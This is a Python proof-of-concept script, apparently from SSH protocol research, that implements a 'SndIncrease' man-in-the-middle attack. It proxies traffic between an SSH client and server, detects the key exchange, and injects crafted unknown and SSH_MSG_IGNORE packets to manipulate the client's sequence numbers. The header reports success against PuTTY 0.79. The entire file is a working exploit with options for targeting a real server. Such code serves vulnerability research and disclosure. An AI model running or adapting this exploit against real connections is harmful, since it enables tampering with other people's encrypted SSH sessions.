#!/usr/bin/python3
from binascii import unhexlify
from time import sleep

import click
from tqdm import trange

from common import contains_newkeys, run_tcp_mitm

#####################################################################################
## Proof of Concept for the SndIncrease technique                                  ##
##                                                                                 ##
## Tested successfully against:                                                    ##
## - PuTTY 0.79 (OpenSSH 9.4p1 Server)                                             ##
##                                                                                 ##
## Tested unsuccessfully:                                                          ##
## - AsyncSSH / libssh (Timeouts)                                                  ##
## - OpenSSH (Wrap-Around Detection)                                               ##
## - dropbear (Disconnect on unknown message)                                      ##
##                                                                                 ##
## Licensed under Apache License 2.0 http://www.apache.org/licenses/LICENSE-2.0    ##
#####################################################################################

rogue_unknown_msg_hex = '0000000C06{}00000000000000000000'
rogue_msg_ignore = unhexlify('0000000C060200000000000000000000')
technique_in_progress = False

@click.command()
@click.option("--proxy-ip", default="0.0.0.0", help="The interface address to bind the TCP proxy to.")
@click.option("--proxy-port", default=22, help="The port to bind the TCP proxy to.")
@click.option("--server-ip", help="The IP address where the SSH server is running.")
@click.option("--server-port", default=22, help="The port where the SSH server is running.")
@click.option("-N", "--increase-by", default=1, help="The number by which C.Snd will be increased.")
@click.option("--unknown-id", default="09", help="The message ID of a message unknown to the implementation")
def cli(proxy_ip, proxy_port, server_ip, server_port, increase_by, unknown_id):
    print("--- Proof of Concept for SndIncrease technique ---", flush=True)
    print("[+] WARNING: Connection failure will occur, this is expected as sequence numbers will not match.", flush=True)
    rogue_unknown_msg = unhexlify(rogue_unknown_msg_hex.format(unknown_id))
    run_tcp_mitm(proxy_ip, proxy_port, server_ip, server_port, forward_server_to_client=lambda in_socket, out_socket: inject_sndincrease(in_socket, out_socket, increase_by, rogue_unknown_msg), forward_client_to_server=pipe_discard_during_technique)

def inject_sndincrease(in_socket, out_socket, increase_by, rogue_unknown_msg):
    global technique_in_progress
    try:
        while True:
            data = in_socket.recv(4096)
            if contains_newkeys(data):
                print("[+] SSH_MSG_NEWKEYS sent by server identified!", flush=True)
                technique_in_progress = True
                print(f"[+] Injecting {increase_by} unknown messages to increase C.Snd by {increase_by}!", flush=True)
                for _ in trange(increase_by):
                    out_socket.send(rogue_unknown_msg)
                print(f"[+] Injecting 2**32 - {increase_by} SSH_MSG_IGNORE to fix C.Rcv!", flush=True)
                for _ in trange(2**32 - increase_by):
                    out_socket.send(rogue_msg_ignore)
                print("[+] Injection done, waiting 3 seconds before continuing to forward traffic.", flush=True)
                # Rough workaround to avoid forwarding any unimplemented messages to the server
                sleep(3)
                technique_in_progress = False
            if len(data) == 0:
                break
            out_socket.send(data)
    except ConnectionResetError:
        print("[!] Socket connection has been reset. Closing sockets.", flush=True)
    except OSError:
        print("[!] Sockets closed by another thread. Terminating pipe_socket_stream thread.", flush=True)
    in_socket.close()
    out_socket.close()

def pipe_discard_during_technique(in_socket, out_socket):
    global technique_in_progress
    try:
        while True:
            # PuTTY does not send SSH_MSG_NEWKEYS until the servers SSH_MSG_NEWKEYS has been received. So don't dropping it here.
            data = in_socket.recv(4096)
            if len(data) == 0:
                break
            if not technique_in_progress:
                out_socket.send(data)
    except ConnectionResetError:
        print("[!] Socket connection has been reset. Closing sockets.", flush=True)
    except OSError:
        print("[!] Sockets closed by another thread. Terminating pipe_socket_stream thread.", flush=True)
    in_socket.close()
    out_socket.close()

if __name__ == '__main__':
    cli()
